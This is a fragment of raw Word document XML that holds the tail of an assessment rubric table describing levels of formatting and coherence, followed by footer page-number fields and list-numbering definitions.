                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve">Mostly well formatted and coherent showing very good appreciation of structure and </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>purpose .</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2529" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="71EB6686" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Formatted and coherent but with errors showing good appreciation of structure and purpose.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2240" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6EC90728" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Formatted and coherent but with major errors showing satisfactory appreciation of structure and purpose.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1893" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="312479B3" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Formatted and coherent but with significant errors showing unsatisfactory appreciation of structure and purpose.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1985" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5F5D9EB8" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:ind w:right="35"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Formatting and coherence of chapters showing no appreciation of structure and purpose.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="59EE2AC5" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="00ED2F72" w:rsidRPr="00ED2F72" w:rsidSect="004D7B3D">
      <w:footerReference w:type="default" r:id="rId52"/>
      <w:footerReference w:type="first" r:id="rId5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895701" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRDefault="00B00D47" w:rsidP="004E733D">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="65171207" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRDefault="00B00D47" w:rsidP="004E73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E33586" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRDefault="00B00D47">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
    </w:pPr>
    <w:r w:rsidRPr="00C015A8">
      <w:rPr>
        <w:i/>
        <w:sz w:val="24"/>
        <w:szCs w:val="24"/>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68859836"/>
      <w:docPartObj>
        <w:docPartGallery w:val="Page Numbers (Bottom of Page)"/>
        <w:docPartUnique/>
      </w:docPartObj>
    </w:sdtPr>
    <w:sdtEndPr>
      <w:rPr>
        <w:color w:val="7F7F7F" w:themeColor="background1" w:themeShade="7F"/>
        <w:spacing w:val="60"/>
      </w:rPr>
    </w:sdtEndPr>
    <w:sdtContent>
      <w:p w14:paraId="3801BB31" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRDefault="00B00D47">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Pr="00A60D20">
          <w:rPr>
            <w:b/>
            <w:bCs/>
            <w:noProof/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:bCs/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t xml:space="preserve"> | </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:color w:val="7F7F7F" w:themeColor="background1" w:themeShade="7F"/>
            <w:spacing w:val="60"/>
          </w:rPr>
          <w:t>Page</w:t>
        </w:r>
      </w:p>
    </w:sdtContent>
  </w:sdt>
  <w:p w14:paraId="35772955" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRDefault="00B00D4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9717893"/>
      <w:docPartObj>
        <w:docPartGallery w:val="Page Numbers (Bottom of Page)"/>
        <w:docPartUnique/>
      </w:docPartObj>
    </w:sdtPr>
    <w:sdtEndPr>
      <w:rPr>
        <w:color w:val="7F7F7F" w:themeColor="background1" w:themeShade="7F"/>
        <w:spacing w:val="60"/>
      </w:rPr>
    </w:sdtEndPr>
    <w:sdtContent>
      <w:p w14:paraId="49BA3CF5" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRDefault="00B00D47" w:rsidP="003363BE">
        <w:pPr>
          <w:pStyle w:val="Footer"/>
          <w:pBdr>
            <w:top w:val="single" w:sz="4" w:space="1" w:color="D9D9D9" w:themeColor="background1" w:themeShade="D9"/>
          </w:pBdr>
          <w:jc w:val="right"/>
          <w:rPr>
            <w:b/>
            <w:bCs/>
          </w:rPr>
        </w:pPr>
        <w:r>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:instrText xml:space="preserve"> PAGE   \* MERGEFORMAT </w:instrText>
        </w:r>
        <w:r>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00373F09">
          <w:rPr>
            <w:b/>
            <w:bCs/>
            <w:noProof/>
          </w:rPr>
          <w:t>13</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:bCs/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t xml:space="preserve"> | </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:color w:val="7F7F7F" w:themeColor="background1" w:themeShade="7F"/>
            <w:spacing w:val="60"/>
          </w:rPr>
          <w:t>Page</w:t>
        </w:r>
      </w:p>
    </w:sdtContent>
  </w:sdt>
  <w:p w14:paraId="08C15654" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRDefault="00B00D4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53404089"/>
      <w:docPartObj>
        <w:docPartGallery w:val="Page Numbers (Bottom of Page)"/>
        <w:docPartUnique/>
      </w:docPartObj>
    </w:sdtPr>
    <w:sdtEndPr>
      <w:rPr>
        <w:color w:val="7F7F7F" w:themeColor="background1" w:themeShade="7F"/>
        <w:spacing w:val="60"/>
      </w:rPr>
    </w:sdtEndPr>
    <w:sdtContent>
      <w:p w14:paraId="7A6BEDFA" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRDefault="00B00D47">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Pr="00A60D20">
          <w:rPr>
            <w:b/>
            <w:bCs/>
            <w:noProof/>
          </w:rPr>
          <w:t>1</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:bCs/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t xml:space="preserve"> | </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:color w:val="7F7F7F" w:themeColor="background1" w:themeShade="7F"/>
            <w:spacing w:val="60"/>
          </w:rPr>
          <w:t>Page</w:t>
        </w:r>
      </w:p>
    </w:sdtContent>
  </w:sdt>
  <w:p w14:paraId="19958A55" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRPr="00A60D20" w:rsidRDefault="00B00D47" w:rsidP="00A60D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F3402B" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRDefault="00B00D47" w:rsidP="004E733D">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="356A05A2" w14:textId="77777777" w:rsidR="00B00D47" w:rsidRDefault="00B00D47" w:rsidP="004E733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E3D3A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="1C846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891D05"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="19D67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352EF5"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="F754ED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C82146E"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="F00463C2"/>
    <w:lvl w:ilvl="0" w:tplc="0809000F">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="715" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="08090019" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%2."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1435" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="0809001B" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%3."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="2155" w:hanging="180"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="0809000F" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%4."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2875" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="08090019" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%5."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3595" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="0809001B" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%6."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="4315" w:hanging="180"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="0809000F" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%7."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5035" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="08090019" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%8."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5755" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="0809001B" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%9."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="6475" w:hanging="180"/>
      </w:pPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="4" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="0F30550B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="E09699BE"/>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5" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="1482775B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="580AFCB0"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="Heading1"/>
      <w:lvlText w:val="%1"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="432" w:hanging="432"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="Heading2"/>
      <w:lvlText w:val="%1.%2"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1001"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153C4FD8"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="CF50B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5238B5"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="89D65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9D19B6"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0270E1CA"/>
    <w:lvl w:ilvl="0" w:tplc="08090001">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1080"/>
        </w:tabs>
        <w:ind w:left="1080" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="08090003">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1800"/>
        </w:tabs>
        <w:ind w:left="1800" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="08090005" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2520"/>
        </w:tabs>
        <w:ind w:left="2520" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="08090001" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3240"/>
        </w:tabs>
        <w:ind w:left="3240" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="08090003" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3960"/>
        </w:tabs>
        <w:ind w:left="3960" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="08090005" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4680"/>
        </w:tabs>
        <w:ind w:left="4680" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="08090001" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5400"/>
        </w:tabs>
        <w:ind w:left="5400" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="08090003" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6120"/>
        </w:tabs>
        <w:ind w:left="6120" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="08090005" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6840"/>
        </w:tabs>
        <w:ind w:left="6840" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="9" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="2945051C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="342A7566"/>
    <w:lvl w:ilvl="0" w:tplc="AEB01C1E">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="•"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1089" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Calibri" w:eastAsia="Calibr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CA607F7"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="60041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E90654"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FA96E058"/>
    <w:lvl w:ilvl="0" w:tplc="08090001">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="739" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="08090003" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1459" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="08090005" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2179" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="08090001" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2899" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="08090003" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3619" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="08090005" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4339" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="08090001" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5059" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="08090003" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5779" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="08090005" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6499" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="12" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="3AA50D06"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="C2829144"/>
    <w:lvl w:ilvl="0" w:tplc="AEB01C1E">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="•"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1089" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Calibri" w:eastAsia="Calibr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B515488"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="7F16E122"/>
    <w:lvl w:ilvl="0" w:tplc="AEB01C1E">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="•"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1089" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="04090003">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1449" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="04090005" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2169" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="04090001" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2889" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="04090003" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3609" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
